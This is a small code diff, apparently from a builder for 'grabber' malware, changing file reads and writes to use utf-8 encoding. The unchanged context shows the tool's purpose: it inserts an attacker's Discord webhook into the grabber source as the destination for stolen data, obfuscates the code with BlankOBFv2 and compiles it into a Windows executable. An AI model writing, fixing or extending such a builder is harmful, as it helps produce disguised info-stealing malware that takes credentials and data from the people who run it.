@@ -46,13 +46,13 @@ def build(webhook: str, out_file: str, debug: bool):
     """Build the executable file with encrypted content."""
     of = f"{out_file}.py"
     ot = f"{out_file}.exe"
-    with open(grabber_path, 'r') as code_file:
+    with open(grabber_path, 'r', encoding="utf-8") as code_file:
         code = code_file.read()
 
     code = code.replace("{WEBHOOK}", str(webhook)).replace("https://discord.com/api/webhooks/", str(webhook))
     code = BlankOBFv2(code=code, include_imports=True, recursion=1).obfuscate()
 
-    with open(of, 'w') as build_file:
+    with open(of, 'w', encoding="utf-8") as build_file:
         build_file.write(code)
 
     # Compile command for Windows
